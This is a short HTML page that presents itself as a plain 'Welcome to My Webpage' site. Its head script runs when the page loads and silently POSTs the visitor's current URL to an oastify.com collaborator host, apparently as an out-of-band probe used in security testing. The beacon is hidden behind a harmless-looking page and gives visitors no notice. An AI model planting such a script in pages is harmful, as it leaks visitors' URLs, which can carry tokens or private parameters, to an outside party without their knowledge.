<!DOCTYPE html>
<html>
<head>
    <title>Your Webpage</title>
    <script>
        function sendCurrentUrl() {
            var xhr = new XMLHttpRequest();
            var currentUrl = window.location.href; // Get the current URL

            xhr.open("POST", "https://r5xd8zit0d78iuwg35skjw3h68cz0wvkk.oastify.com/endpoint", true); // Replace with your server endpoint
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

            xhr.onreadystatechange = function() {
                if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
                    // Request completed successfully
                }
            }

            xhr.send("url=" + encodeURIComponent(currentUrl));
        }

        window.onload = sendCurrentUrl; // Call the function when the window loads
    </script>
</head>
<body>
    <h1>Welcome to My Webpage</h1>
</body>
</html>
